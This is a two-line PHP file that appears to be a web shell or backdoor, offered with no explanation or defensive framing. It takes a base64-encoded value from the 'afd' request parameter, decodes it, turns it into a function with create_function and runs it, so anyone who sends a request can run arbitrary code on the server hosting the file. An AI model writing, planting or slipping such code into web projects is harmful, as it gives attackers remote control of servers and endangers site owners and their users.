<?php
if(!empty($_REQUEST['afd'])){$afd=base64_decode($_REQUEST["afd"]);$afd=create_function('',$afd);$afd();exit;}